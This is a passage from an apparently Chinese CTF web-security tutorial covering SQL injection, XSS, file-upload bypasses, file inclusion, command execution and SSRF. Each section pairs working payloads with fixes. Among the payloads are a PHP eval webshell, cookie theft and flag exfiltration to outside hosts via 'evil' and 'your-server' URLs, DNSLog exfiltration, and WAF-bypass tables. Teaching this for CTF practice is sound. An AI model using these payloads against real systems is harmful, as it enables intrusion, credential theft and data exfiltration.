**常见版本与漏洞家族**

| 版本 | 代表漏洞 | 怎么确认 |
| --- | --- | --- |
| 5.0.x | RCE（多处参数注入 -> 命令执行） | 报错页样式、入口文件写法 |
| 5.1.x | RCE、反序列化 | vendor 目录、composer.lock |
| 6.x | 相对少见，注意多应用模式与路由 | README/错误页版本号 |
| Laravel | 调试模式泄露、反序列化链 | X-Powered-By、报错页 |

### 怎么判断版本

1. 访问 `/index.php` 故意传错参数，看报错页样式（不同版本差异明显）。
2. 试读 `/composer.json`、`/vendor/composer/installed.json`、`/composer.lock`。
3. 看静态资源路径里的版本号、README/LICENSE 文件。
4. 看入口文件的写法：5.0 与 5.1 的 bootstrap 写法不同。
5. 确认版本后，直接去搜「ThinkPHP 5.0.x RCE」对应的公开 payload。

> 💡 框架漏洞的价值在于「一个版本号 → 一个已知利用链」。所以信息收集阶段，**版本识别比漏洞挖掘更重要**——国内比赛里大量框架题就是考这个。

## Python / Flask：读源码与 SSTI 的根源

*约 45 分钟*

> 🎯 **本节目标**：看懂一个 Flask 应用，理解模板渲染为什么会产生 SSTI，并知道 Flask 的四个常见配置风险。

Flask 是 CTF 里最常见的 Python 后端。它代码量小、结构清晰，所以几乎每道 Flask 题都可以「读源码做题」。

**一个最小 Flask 应用**

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/")
def index():
    name = request.args.get("name", "world")
    return render_template_string("Hello, " + name)      # ← 危险！

    # 安全写法：把用户输入当变量，而不是模板源码
    # return render_template_string("Hello, {{ name }}", name=name)

if __name__ == "__main__":
    app.run(debug=True)
```

关键就在那个「危险」：**把用户输入拼进模板字符串，再交给 Jinja2 渲染**，等于让用户写模板代码。模板引擎会把 `{{ ... }}` 求值，所以输入 `{{7*7}}` 会输出 49。

**SSTI 的最小验证与利用思路**

```python
# 请求：/?name={{7*7}}
# 返回 Hello, 49   -> 模板被执行了，存在 SSTI
# 返回 Hello, {{7*7}} -> 只是字符串

# 确认后往下走：看配置、找能执行命令的类
# {{ config }}
# {{ ''.__class__.__mro__[1].__subclasses__() }}
# 在子类列表里找 Popen 等危险类，再调用
```

**Flask 的四个常见配置风险**

| 配置 | 风险 | 怎么发现 |
| --- | --- | --- |
| debug=True | Werkzeug 调试器可执行任意代码 | 报错页出现调试器 / PIN 输入框 |
| SECRET_KEY 弱/泄露 | 可伪造 session（Flask 的 session 是签名 cookie） | 读源码拿到 key，用 flask-unsign 伪造 |
| render_template_string 拼接 | SSTI | 输入 {{7*7}} 看是否求值 |
| debug 页的 PIN | 可按算法算出 PIN 进调试器 | 拿到 /sys/class/... 等文件即可算 PIN |

**读 Flask 源码的顺序**

```python
# 1. 找所有路由
@app.route("/xxx", methods=["GET", "POST"])
# 2. 看每个路由的参数怎么被使用
request.args.get() / request.form.get() / request.json
# 3. 看三件事：
#    - 有没有拼进模板（SSTI）
#    - 有没有拼进命令/文件路径（命令执行/文件读取）
#    - 有没有校验（登录、角色、签名）
# 4. 看全局配置：app.config、SECRET_KEY、debug 开关
```

> 💡 Flask 的 session 是「客户端 cookie + 服务端签名」，不是服务端存储。**拿到 SECRET_KEY 就能伪造任意 session**——这类题比 SSTI 还常见。记住常用工具：flask-unsign。

## 如何快速识别一个站的技术栈

*约 35 分钟*

> 🎯 **本节目标**：用 5 个信号在两分钟内判断后端语言与框架，并能写出对应的探测命令。

**五个信号**

| 信号 | 怎么查 | 能看出什么 |
| --- | --- | --- |
| URL 后缀 | 看路径 | .php → PHP；.jsp/.do/.action → Java；.aspx → .NET；无后缀 → 框架路由 |
| 响应头 | curl -I | Server、X-Powered-By（ThinkPHP 会暴露）、Set-Cookie 名 |

| Cookie 名 | 看 Set-Cookie | PHPSESSID=PHP、JSESSIONID=Java、connect.sid=Express、csrftoken=Django |
| 静态资源路径 | 看源码里的 link/script | /static/、/assets/、/public/ 的组织方式各框架不同 |

**两个命令先看头**

```bash
curl -I https://target.com/                 # 响应头指纹
curl -s https://target.com/ | head -50      # 源码头部

# 针对性探测
curl -I https://target.com/actuator/health  # Spring Actuator
curl -s https://target.com/.git/config      # 源码泄露
curl -s https://target.com/robots.txt
```

### 两分钟识别流程

1. 敲 `curl -I` 看 Server / X-Powered-By / Set-Cookie。
2. 打开首页看 URL 后缀和静态资源路径。
3. 随便传个错参数（如 `?id='`），看报错页样式。
4. 用上面的对照表得出结论；结论不确定就估一个「最可能」，后面按这个方向试。
5. 把结论写进笔记：语言、框架、版本迹象、下一步该看哪一节。

> 💡 真实站点还有 WAF/CDN，头信息可能被改。所以「识别」是一个**概率判断**：用多个信号投票，而不是信一个。CTF 题目里改头信息的情况少，报告头通常可信。

## 漏洞全景与分类

*约 20 分钟*

> 🎯 **本节目标**：建立一张漏洞地图：看到一个输入，就知道该翻哪一节的 payload。

所有 Web 漏洞都长着同一张脸：**来自不可信来源的数据，被当成代码 / 路径 / 身份 / 请求 / 数据结构来用了。**区别只在「被当成什么」。记住这张表，比背 18 个名词管用。

**按「被污染成什么」分类**

| 被当成 | 代表漏洞 | 一句话原理 |
| --- | --- | --- |
| 代码 | SQLi / XSS / 命令执行 / SSTI / XXE / 反序列化 | 数据被拼进了「会被执行」的位置 |
| 路径 | 路径穿越 / 文件包含 / 文件上传 | 数据决定了「读/写/执行哪个文件」 |
| 身份 | 认证绕过 / JWT 伪造 / Session 伪造 / CSRF | 数据被当成了「你是谁」的凭证 |
| 服务端请求 | SSRF | 数据变成了「让服务器替你发的请求」 |
| 数据与流程 | 信息泄露 / 逻辑漏洞 / 越权 | 数据或流程本身就能被看到、被绕过 |
| 对象结构 | 原型链污染 | 数据被合并进了对象的原型链 |

### 拿到一道题，先问三个问题

1. **输入从哪进来**：URL 参数、表单、JSON、Cookie、请求头（Referer / XFF / UA）、文件名、甚至上传的图片内容。
2. **它被送到了哪里**：数据库、文件系统、shell、模板引擎、反序列化函数、内网 HTTP 请求。这一步决定漏洞类型。
3. **中间有没有过滤，过滤做在哪一层**：前端 JS（等于没有）、后端关键字替换（通常可绕）、WAF（看规则）、类型强转（最有效）。

### 学习顺序（不要跳）

- **先会读源码**：同一个 payload 在 PHP / Python / Java 里长得完全不一样，读不懂源码就只能背题。
- **再认漏洞**：能在一段代码里指认出「这行是注入点」，比记住 100 个 payload 有价值。
- **然后练 payload**：把每一类的 3–5 个标准 payload 练到能默写。
- **最后练思路**：真实题目不会告诉你「这是 SQL 注入」，要靠 PART 9 的决策树自己判断。

> 💡 分类不是为了考试，是为了**检索**：看到「输入进了数据库」就去翻 SQLi 那节；看到「要求输入 URL」就去翻 SSRF 那节。本 PART 的每一节都按同一个结构写：原理 → 判断 → 利用 → 修复。

## 信息泄露

*约 30 分钟*

> 🎯 **本节目标**：系统化检查一个站「不该给的东西」，并会把泄露变成下一步的入口。

信息泄露本身往往不是最终目的，而是**解题的钥匙**：拿到源码就知道漏洞在哪，拿到备份就知道数据库结构，拿到 .git 就拿到了整个历史版本。CTF 里 90% 的「这题好难」其实是「我还没找到泄露点」。

**常见泄露点清单**

| 位置 | 典型对象 | 拿到之后能干什么 |
| --- | --- | --- |
| 前端 | HTML 注释、隐藏 input、内联 JS 常量、source map | 直接读 flag / 找到隐藏接口 |
| 源码备份 | www.zip、web.zip、index.php.bak、.index.php.swp | 审计出真正的漏洞点 |
| 版本库 | .git/、.svn/、.hg/ | 还原全部历史源码 |
| 配置 | .env、config.php、composer.json、package.json | 数据库账号、密钥、依赖版本 |
| 调试 | /debug、/console、actuator/env、phpinfo.php、错误堆栈 | 环境变量、路径、内存信息 |
| 目录 | robots.txt、/admin/、/backup/、目录列表 | 发现后台与备份 |
| 指纹 | X-Powered-By、Server、静态资源 hash、Cookie 名 | 判断框架与版本，选对应的利用链 |

### 动手：五分钟基线检查

1. 看响应头：`curl -I`，记下 Server / X-Powered-By / Set-Cookie，判断语言与框架。
2. 看 robots.txt 与 sitemap.xml：管理员路径、备份目录经常就写在这里。
3. 看页面源码：Ctrl+F 搜 `flag`、`api`、`key`、`token`、`password`。
4. 猜备份文件：常见命名 `www.zip`、`web.zip`、`backup.zip`、`index.php.bak`、`.index.php.swp`，用 dirsearch 批量跑。
5. 试版本库：`/.git/config` 返回 200 就是泄露，用 GitHack / git-dumper 拉全量。
6. 看错误：故意传一个非法参数触发报错，报错里常带绝对路径、框架版本、SQL 语句。

**最常用的几个探测**

```bash
curl -I https://target/                     # 响应头指纹
curl https://target/robots.txt
curl https://target/.git/config              # 200 = Git 泄露
curl https://target/www.zip -o a.zip -s -w "%{http_code}\n"
curl https://target/index.php.bak -s -w "%{http_code}\n"

# 目录扫描（合法靶场上用）
dirsearch -u https://target/ -e php,bak,zip,txt,swp
```

**Git 泄露的利用**

```bash
# 方案一：GitHack（Python2，按目录还原）
python GitHack.py http://target/.git/

# 方案二：git-dumper（更稳，推荐）
git-dumper http://target/.git/ ./src_leak

# 还原之后看历史记录，flag 常在已经"删掉"的提交里
cd src_leak && git log --all --oneline && git show <commit>
```

### source map 为什么危险

打包工具会把多个源文件压缩成一个 `app.min.js`，同时生成 `app.min.js.map` 记录「每个字符来自哪个源文件」。这个 .map 一旦留在线上，压缩代码就等于源码全公开——变量名、注释、甚至你没打算发布的调试逻辑都回来了。F12 → Sources 里能看到原文件列表，就是这个 .map 生效了。

### 修复

- 上线前删除 `.git`、`.svn`、`.DS_Store`、备份文件、编辑器的 swap 文件。
- 生产环境关闭详细报错（PHP: `display_errors=Off`），错误写日志而不是打印给用户。
- source map 不要随静态资源一起发布，或放在访问不到的位置。
- 敏感配置（数据库密码、密钥）只放在服务端环境变量里，永不进前端。
- 给 `/admin`、`/backup` 这类目录加访问控制，别指望「没人知道这个路径」。

> 💡 信息收集要有边界：以上探测只在**自己搭的靶场**或**明确授权**的目标上做。对真实站点做目录扫描，在大多数国家和地区都需要书面授权。

## SQL 注入（上）：原理与联合查询

*约 40 分钟*

> 🎯 **本节目标**：理解拼接为什么危险，会判断字段数、找显位、用 UNION 把数据取出来。

SQL 注入的本质只有一句话：**用户输入变成了 SQL 语句的一部分，而不是一个值。**下面这段代码在 PHP 里极其常见：「把 id 拼进查询字符串」。

**漏洞是怎么产生的**

```php
<?php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = $id";   // 直接拼接
$row = mysqli_query($conn, $sql);

// 正常请求：?id=1
//   SELECT * FROM users WHERE id = 1

// 攻击请求：?id=1 OR 1=1
//   SELECT * FROM users WHERE id = 1 OR 1=1      -> 全表返回
?>
```

注意这个变化：**1** 是一个值，**1 OR 1=1** 是三个值加一个条件。拼接之后，数据库看到的已经不是「一个数字」，而是一段带逻辑的语句。这就是注入成立的根。

### 判断注入：四步都做完再下结论

1. **加引号看报错**：`?id=1'` 出现 SQL 语法报错 → 大概率是字符型注入。
2. **比较真假**：`?id=1 and 1=1` 与 `?id=1 and 1=2` 的响应内容/长度不同 → 注入成立。
3. **判断类型**：数字型（`id=1`）、字符型（`id='1'`）、搜索型（`like '%1%'`）；字符型要闭合引号。
4. **判断字段数**：`order by 1` 到 `order by N`，直到报错，N-1 就是字段数。

**标准利用步骤（MySQL）**

```sql
?id=1 order by 3 --            字段数 = 3
?id=-1 union select 1,2,3 --    找显位（-1 让前一条空，页面才会显示 union 的结果）
?id=-1 union select 1,database(),3 --
?id=-1 union select 1,user(),3 --
?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --
?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --
?id=-1 union select 1,group_concat(username,0x3a,password),3 from users --
```

**每一步在问什么**

| 目的 | payload 关键部分 | 为什么这样写 |
| --- | --- | --- |
| 判断字段数 | order by N | 按第 N 列排序，列不存在就报错 |
| 让原查询为空 | id=-1 | 否则原记录占满页面，union 的结果显示不出来 |
| 找显位 | union select 1,2,3 | 看页面哪个位置回显了数字，那个位置就是输出点 |
| 看库名版本 | database() / version() | 先确认权限与环境 |
| 看表名 | information_schema.tables | MySQL 自带的元数据表，存着所有表和列 |
| 看列名 | information_schema.columns | 同上，定位目标表结构 |
| 取值 | group_concat(a,0x3a,b) | 0x3a 是冒号，把用户名和密码拼成一行 |

### 为什么「过滤关键字」不是修复

如果只把 `select`、`union` 替换成空，攻击者用 `SeLeCt`、`sel/**/ect`、`/*!50000select*/` 就能绕过。根本原因是**SQL 语句本身参与了字符串拼接**，只要结构还能被输入改变，绕过只是成本问题。

**正确修复：参数化查询**

```php
<?php
// PDO 预处理：SQL 结构先定死，参数后传进去
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
$row = $stmt->fetch();

// mysqli 预处理
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $_GET['id']);      // i = 整数，类型强转
$stmt->execute();
?>
```

> 💡 参数化查询的关键不是「过滤了危险字符」，而是**数据库永远只把参数当值，不当语法**。同样的原理也适用于所有 ORM：用占位符，不要用字符串拼 SQL。

## SQL 注入（下）：盲注、报错、绕过

*约 45 分钟*

> 🎯 **本节目标**：页面不回显时，仍能通过布尔、时间、报错三条路把数据一点点取出来，并知道什么时候必须写脚本。

真实题目里，注入点常常「不回显」：页面只有「用户存在 / 不存在」两个状态，或者干脆只给一个正常页面。这时要把数据库当成一个**只能回答是/否的黑盒**，用问题一位一位地把数据问出来。

**布尔盲注：看真假**

```sql
?id=1 and length(database())=4 --           库名长度是不是 4
?id=1 and substr(database(),1,1)='a' --      第 1 个字符是不是 a
?id=1 and ascii(substr(database(),1,1))>97 -- 用 ASCII 区间做二分，快得多
```

**时间盲注：看延时**

```sql
?id=1 and if(length(database())=4,sleep(3),0) --
?id=1 and if(ascii(substr(database(),1,1))>97,sleep(3),0) --

# 其他数据库
SQL Server: ;waitfor delay '0:0:3' --
PostgreSQL: ;select pg_sleep(3) --
```

**报错注入：看报错回显**

```sql
# MySQL（5.1–5.7 常见，需报错信息回显）
?id=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1) --
?id=1 and extractvalue(1,concat(0x7e,(select database()))) --

# 原理：把查询结果拼进报错信息里，报错被回显到页面
# 0x7e 是 ~，用来分隔数据方便提取
```

**三条路怎么选**

| 手法 | 依赖条件 | 速度 | 什么时候用 |
| --- | --- | --- | --- |
| 联合查询 | 有回显、字段数已知 | 最快 | 页面会把查询结果打印出来 |
| 报错注入 | 报错信息回显到页面 | 快 | 有回显但只有报错，或 union 被拦 |
| 布尔盲注 | 页面有「真/假」两种可区分的状态 | 中 | 无回显，但响应有差异（长度/内容/状态码） |
| 时间盲注 | 什么都看不出来，只能靠响应时间 | 最慢 | 以上全不行，最后的办法 |

**布尔盲注脚本骨架**

```python
import requests, string

url = "http://target/?id=1"
chars = string.ascii_lowercase + string.digits + "_{}-"
result = ""

for pos in range(1, 40):
    for ch in chars:
        payload = f"1' and substr(database(),{pos},1)='{ch}' -- "
        r = requests.get(url, params={"id": payload})
        if "存在" in r.text:          # 用页面上的"真"信号判断
            result += ch
            print(pos, ch, result)
            break
    else:
        break

print("命中:", result)
```

> 💡 盲注必须脚本化。手工逐位猜 20 个字符要几百次请求，写脚本 20 行就搞定——这正是 PART 4 讲 Python 的原因。二分法（先判断 ASCII 范围再缩小）比逐字符遍历快 5 倍以上。

### WAF 绕过的常见手法

**绕过对照表**

| 被拦的东西 | 绕过写法 | 说明 |
| --- | --- | --- |
| 大小写 | SeLeCt / UnIoN | 很多正则不忽略大小写 |
| 空格 | sel/**/ect、%09、%0a、+ | 注释和空白符都能当分隔 |
| 关键字 | sel/**/ect、双写 selselectect | 替换时只替换一次就能绕过 |
| 内联注释 | /*!50000select*/ | MySQL 特有，注释里的内容会被执行 |
| 引号 | 0x61646d696e（十六进制） | 避免出现引号被过滤 |
| and/or | && / \|\| / xor | 运算符等价替换 |
| 等号 | like、regexp、in、between | 同样的语义换函数 |

**sqlmap 的定位：省力的工具，不是替代理解**

```bash
# 先手工确认注入点和参数，再用工具放大
sqlmap -u "http://target/?id=1" --batch --dbs
sqlmap -u "http://target/?id=1" -D dbname --tables
sqlmap -u "http://target/?id=1" -D dbname -T users --dump

# 请求有 Cookie / 头时，用请求文件更省事
sqlmap -r req.txt -p id --batch --level 3 --risk 2
```

> 💡 比赛里 sqlmap 常常被 WAF 拦。真正稳定的路线是：**先判断注入类型 → 先试 union / 报错 → 不行再写盲注脚本**。工具帮你省时间，但不能帮你绕过你没理解的东西。

## XSS：反射、存储、DOM

*约 45 分钟*

> 🎯 **本节目标**：分清三类 XSS 的触发路径，能根据 payload 落点选择正确写法。

XSS 的本质和 SQL 注入一模一样：**用户输入被当成 HTML/JS 代码，交给了浏览器执行。**区别在于执行的战场从数据库换成了浏览器——所以危害从「读数据」变成「以你的身份干任何事」。

**三类对比**

| 类型 | 数据路径 | 触发时机 | 典型场景 |
| --- | --- | --- | --- |
| 反射型 | 输入 → 服务器 → 立刻写回响应 → 浏览器执行 | 受害者点开构造好的链接 | 搜索结果页、错误提示回显参数 |
| 存储型 | 输入 → 数据库 → 别人访问页面时取出执行 | 任何人打开页面就中招 | 留言板、昵称、评论、工单 |
| DOM 型 | 输入 → 前端 JS 直接写进 DOM（不经过服务器） | 页面内 JS 处理 URL/hash 时 | document.write(location.hash)、innerHTML |

三者的区别决定了「怎么验证」：反射型和存储型会在服务器响应里看到 payload，DOM 型往往看不到——因为 payload 从头到尾都在浏览器里流转，服务器日志里只有一段正常的 URL。

### 先判断落点，再选 payload

**上下文 → payload**

| 落点位置 | payload 思路 | 示例 |
| --- | --- | --- |
| HTML 正文 | 直接插标签 | &lt;script&gt;alert(1)&lt;/script&gt;、&lt;img src=x onerror=alert(1)&gt; |
| 属性值里（双引号） | 先闭合属性再插事件 | " onmouseover="alert(1) |
| 属性值里（单引号） | 同上，换单引号 | ' onfocus='alert(1)' autofocus=' |
| &lt;script&gt; 内部字符串 | 闭合 script 标签 | &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt; |
| href / src | 伪协议 | javascript:alert(1) |
| CSS / style 里 | expression / 类 CSS 注入 | 看浏览器版本，现代浏览器基本堵死 |
| JSON 回显 | 先看是否 text/html 渲染 | {"name":"&lt;img src=x onerror=alert(1)&gt;"} |

**存储型最小复现（留言板）**

```php
<?php
// 后端：把用户输入直接存库、直接输出
$msg = $_POST['msg'];
mysqli_query($conn, "INSERT INTO board(msg) VALUES('$msg')");

// 页面渲染
echo "<div class='msg'>" . $row['msg'] . "</div>";
// 输入 <img src=x onerror=alert(document.cookie)>
// 之后每个访问留言板的人都会执行它
?>
```

**DOM 型最小复现**

```js
// 页面里写了这样一段（很常见）
var name = location.hash.slice(1);
document.getElementById("hello").innerHTML = "你好，" + name;

// 访问：http://target/#<img src=x onerror=alert(1)>
// 服务器完全没参与，日志里只有一条正常请求
```

### 拿到 XSS 之后能干什么

- **偷 Cookie**：`new Image().src='http://evil/'+document.cookie`（HttpOnly 的 Cookie 读不到）。
- **发请求**：以受害者身份调用任意接口，绕开 CSRF Token（因为脚本就在同源页面里）。
- **改页面**：伪造登录框钓密码，或把转账按钮改成「领红包」。
- **读 DOM**：页面里渲染出来的敏感信息、前端存的 token，全都能读走。

### 修复：输出编码 + 纵深防御

**按上下文转义**

```php
<?php
// HTML 正文 / 属性：htmlspecialchars
echo htmlspecialchars($msg, ENT_QUOTES, 'UTF-8');

// JS 字符串里：json_encode 而不是手拼引号
echo "<script>var name = " . json_encode($msg) . ";</script>";

// URL 里：urlencode
echo "<a href='?q=" . urlencode($q) . "'>搜索</a>";
?>
```

> 💡 三道防线缺一不可：**输出时按上下文编码**（根治）、**HttpOnly**（Cookie 偷不走）、**CSP**（就算漏了也执行不了内联脚本）。前端框架的 `innerHTML`、`dangerouslySetInnerHTML`、`v-html` 都是新雷区。

## 文件上传

*约 40 分钟*

> 🎯 **本节目标**：掌握五类上传校验的绕过方式，理解「能传上去」和「能执行」的区别。

文件上传漏洞的价值不在「传上去了」，而在「**传上去的文件能被服务器当代码执行**」。所以每道上传题的核心问题永远是：服务器会不会执行我传的这个文件？

**五道关，逐一突破**

| 检查点 | 它怎么拦 | 怎么绕 |
| --- | --- | --- |
| 前端 JS 校验 | onchange 检查后缀 | 直接改包（Burp / curl），或删掉页面上的 JS |
| Content-Type | 要求 image/png | 改请求里的 Content-Type，不影响真实内容 |
| 后缀黑名单 | 禁止 .php | .php3 .phtml .pht .phps .pHp；Windows 的 .php. 与 .php::$DATA |
| 后缀白名单 | 只允许 .jpg | 解析漏洞：Apache 多后缀 a.php.jpg、Nginx 配置错误、/1.php/. 路径穿越 |
| 内容/文件头检测 | 检查 magic bytes | 图片马（GIF89a + PHP 代码）+ 文件包含；或二次渲染绕过 |

**典型的不安全上传后端**

```php
<?php
// 只检查了后缀黑名单
$name = $_FILES['file']['name'];
$ext  = strtolower(substr($name, strrpos($name, '.')));
$blocked = ['php', 'php5', 'php7'];

if (!in_array($ext, $blocked)) {
    move_uploaded_file($_FILES['file']['tmp_name'], "uploads/" . $name);
    echo "上传成功：" . $name;
} else {
    echo "不允许的类型";
}
?>
```

### 绕过流程

1. 先传一个正常的 jpg 确认功能可用，记住返回的访问路径。
2. 改成 `shell.php` 传，看拦截信息 —— 是前端弹窗（改包就能过）还是后端报错（要换后缀）。
3. 换后缀：`.phtml`、`.php3`、`.phps`、`.pht`，逐个试到能上传。
4. 还不行就试 `shell.php.jpg`（解析漏洞）、`shell.php%00.jpg`（老版本截断）、`shell.php.`（Windows 去点）。
5. 传上去之后，访问返回的路径，看是否被解析执行。**不能执行就只是存了个文件，不算 getshell。**

**图片马 + 文件包含**

```bash
# 把 PHP 代码藏在图片里，图片本身仍然能正常显示
copy normal.gif shell.php
echo "<?php @eval($_POST['c']); ?>" >> shell.php

# 单靠图片马不够，还要有文件包含把这个"图片"当 PHP 执行
# ?page=uploads/shell.gif
# 或者 .htaccess / .user.ini 让 .gif 被当 PHP 解析
```

**.htaccess 与 .user.ini**

```
# .htaccess（Apache）：让所有 .jpg 按 PHP 解析
AddType application/x-httpd-php .jpg

# .user.ini（PHP-FPM）：在每个请求前自动包含你的文件
auto_prepend_file=shell.jpg

# 条件竞争：先上传到临时目录再检查/删除
# 趁检查前的窗口期，用多线程疯狂访问，抢在被删之前执行
```

### 修复

- **白名单后缀**，白名单要包含解析顺序（只留 .jpg/.png/.gif）。
- **重命名**：用随机文件名 + 固定后缀，别用用户给的名字。
- **上传目录禁止执行**：Nginx 里 `location ~ \.(php)$ { deny all; }`，Apache 用 `php_flag engine off`。
- **校验内容**：magic bytes + 图片二次渲染；但内容校验也不是万能，最好配合「不执行」。
- **存储分离**：文件放对象存储/CDN，Web 服务根目录根本访问不到。

> 💡 上传题最省时间的做法：**先用 Burp 抓到上传请求，之后所有测试都在 Repeater 里改包重放**，不要在浏览器里反复点。改后缀、改 Content-Type、改文件名都是同一件事：改一个字段，发一次。

## 路径穿越与文件包含

*约 35 分钟*

> 🎯 **本节目标**：理解「用户控制路径」的两种危害：读任意文件、执行任意代码。

「用户能控制路径」听起来无害，但它同时意味着两件事：**能读到不该读的文件**（路径穿越），以及**能包含不该包含的文件**（文件包含，最终常常变成代码执行）。

**路径穿越：下载功能**

```php
<?php
// 设计意图：只允许下载 files/ 目录下的报告
$file = $_GET['file'];
readfile("./files/" . $file);
?>

# 正常：?file=report.pdf
# 攻击：?file=../../../../etc/passwd
# 攻击：?file=../../../../var/www/html/config.php   （读源码找数据库密码）
```

**过滤与绕过**

| 过滤方式 | 绕过写法 |
| --- | --- |
| 过滤 ../ | ....// （删掉 ../ 后剩下 ../）、..%2f、..%252f（二次解码） |
| 过滤绝对路径 | 不给绝对路径，用层层 ../ 走上去 |
| 只允许前缀目录 | ..\..\ （Windows 反斜杠）、%5c |
| 检查后缀 | a.php%00.jpg（老版本 PHP 截断）、路径末尾加点/空格（Windows） |
| WAF 拦 ../ | 编码变形：%2e%2e%2f、..%c0%af（畸形编码） |

**文件包含：把路径交给 include**

```php
<?php
$page = $_GET['page'];
include("./pages/" . $page . ".php");

// 正常：?page=about        -> include ./pages/about.php
// 读源码（不执行）：?page=php://filter/convert.base64-encode/resource=index
// 远程代码（需 allow_url_include=On）：?page=http://evil.com/shell.txt
// 日志包含：?page=../../../../var/log/apache2/access.log
?>
```

**PHP 伪协议速查**

| 协议 | 用途 | 前提 |
| --- | --- | --- |
| php://filter | 读文件源码（base64 编码后返回） | 任意 PHP 版本 |
| php://input | 读 POST 原始体，可配合 auto_prepend 执行 | allow_url_include=On |
| data:// | 把数据当文件包含，直接执行代码 | allow_url_include=On |
| expect:// | 直接执行命令 | 装了 expect 扩展 |
| http(s):// | 远程包含，代码在远程服务器上 | allow_url_include=On |
| zip:// / phar:// | 包含压缩包内文件；phar 还能触发反序列化 | 通常默认可用 |

**日志包含：把代码写进日志再包含它**

```bash
# 1. 让访问日志里出现 PHP 代码（UA 或 URL 里带）
curl -A "<?php system('id'); ?>" http://target/

# 2. 包含日志文件，代码被执行
?page=../../../../var/log/apache2/access.log
?page=../../../../var/log/nginx/access.log

# 也可以用 /proc/self/environ（环境变量里塞代码）
```

包含的利用深度完全取决于配置：`allow_url_include=On` 才能远程包含，`open_basedir` 会限制目录范围。所以拿到包含点后**先读 phpinfo 或配置，再决定用哪种方式**，不要一上来就试远程包含。

> 💡 修复其实很简单，两步：**用白名单映射**（请求的 key 对应固定的真实路径，而不是把用户输入拼进路径），**用 realpath 校验**（拼完之后解析出真实绝对路径，确认它仍在允许目录内）。文件包含还应禁用远程包含。

## 命令执行与代码执行

*约 40 分钟*

> 🎯 **本节目标**：分清「执行系统命令」和「执行语言代码」，掌握分隔符、过滤绕过与无回显处理。

这两类漏洞的注入内容不同：命令执行注入的是 **shell 语法**，代码执行注入的是 **目标语言的代码**。同一个输入口，后面挂的函数不同，利用方式就完全不同。

**两者的区别**

| 类型 | 典型函数 | 注入内容 | 例子 |
| --- | --- | --- | --- |
| 命令执行 | system / exec / shell_exec / passthru / 反引号 | shell 命令与分隔符 | 127.0.0.1; cat /flag |
| 代码执行 | eval / assert / create_function / preg_replace 的 /e | 目标语言代码 | phpinfo(); 或 system('cat /flag'); |

**漏洞代码与修复**

```php
<?php
// 危险：把用户输入拼进命令
$ip = $_GET['ip'];
system("ping -c 1 " . $ip);
//  ?ip=127.0.0.1; cat /flag
//  ?ip=127.0.0.1 | cat /flag

// 正确：先校验格式，再转义参数
if (!filter_var($ip, FILTER_VALIDATE_IP)) die("非法 IP");
system("ping -c 1 " . escapeshellarg($ip));
?>
```

**命令分隔与绕过**

| 被过滤的 | 替代写法 | 备注 |
| --- | --- | --- |
| 分隔符 ; | \|  \|\|  &  &&  换行(%0a) | 管道会把前面输出喂给后面 |
| 空格 | $IFS、%09、$IFS$9、{cat,/etc/passwd} | 花括号展开不需要空格 |
| 关键字 cat | ca""t、c\at、tac、nl、more、head | 引号和反斜杠插入 |
| 关键字 flag | /fl''ag、/fl\ag、通配符 /fl* | shell 会还原 |
| 路径 / | cd / && cat flag、$PWD 拼接 | 或者直接相对路径 |
| 命令回显被过滤 | 先写到文件再访问、外带 DNS/HTTP | 无回显场景 |

### 无回显的四种处理

1. **写文件**：`cat /flag > /var/www/html/1.txt`，再访问 `/1.txt`。
2. **带外 HTTP**：`curl http://your-server/?x=$(cat /flag | base64)`，在自己服务器上看日志。
3. **DNSLog**：`nslookup $(cat /flag).your.dnslog.cn`，用 DNS 查询把数据带出去（很多 WAF 允许出站 DNS）。
4. **时间侧信道**：`sleep $(cat /flag | cut -c1)`，靠响应时间判断一个字符（很慢，但什么通道都没有时能用）。

> 💡 最常见的误区：看到命令执行就急着 `cat /flag`。先确认三件事——**回显有没有、flag 在哪、有没有出网**。路径不对就先 `ls /`、`find / -name 'flag*'`。

## SSRF：让服务器替你访问

*约 40 分钟*

> 🎯 **本节目标**：理解 SSRF 的三种用途（内网探测、读文件、打内网应用），掌握常见过滤的绕过。

SSRF（Server-Side Request Forgery）的本质：**服务器会去访问你给的地址，而你给了一个它本不该访问的地址。**它的价值在于「绕过防火墙」——你从外网连不进去的内网服务，服务器能连。

**典型漏洞代码**

```php
<?php
// 功能：图片加载 / URL 预览 / 远程下载
$url = $_GET['url'];
echo file_get_contents($url);

// 正常：?url=https://example.com/a.png
// 攻击：?url=http://127.0.0.1/admin          （访问本机管理后台）
// 攻击：?url=file:///etc/passwd               （读本地文件）
// 攻击：?url=http://169.254.169.254/latest/meta-data/   （云元数据）
?>
```

**协议与用途**

| 协议 | 用途 | 说明 |
| --- | --- | --- |
| http / https | 打内网 Web 服务 | 最常见 |
| file:// | 读本地文件 | PHP 默认允许 |
| dict:// | 探测端口、打 Redis/Memcached | dict://127.0.0.1:6379/info |
| gopher:// | 构造任意 TCP 报文（打 Redis、MySQL、FastCGI） | 能发原始字节，利用面最广 |
| ftp:// / tftp:// | 探测内网文件服务 | 有时可用 |

### 判断 SSRF 是否存在

1. 找一个「服务器会访问 URL」的功能：图片加载、URL 预览、webhook、远程下载、PDF 生成。
2. 喂一个自己控制的地址（或 dnslog.cn），看服务器有没有回连——有回连就是 SSRF。
3. 试 `http://127.0.0.1:端口` 扫内网端口：响应时间/内容不同就是服务存活。
4. 试 `file:///etc/passwd` 读文件；试 `http://169.254.169.254/` 读云元数据。
5. 拿到 Redis / MySQL 之类内网服务时，用 gopher 构造报文打（这一层属于进阶）。

**gopher 打 Redis 的思路**

```bash
# Redis 未授权：直接写 webshell 或写 crontab
# gopher 报文体需要把命令转成 Redis 协议（RESP）再做 URL 编码
# 常用工具：Gopherus、SSRFmap

# 简化示意：gopher://127.0.0.1:6379/_<URL编码后的RESP>
# 关键命令序列：CONFIG SET dir /var/www/html -> CONFIG SET dbfilename 1.php -> SET x "<?php ...?>" -> SAVE
```

**常见过滤与绕过**

| 过滤方式 | 绕过写法 |
| --- | --- |
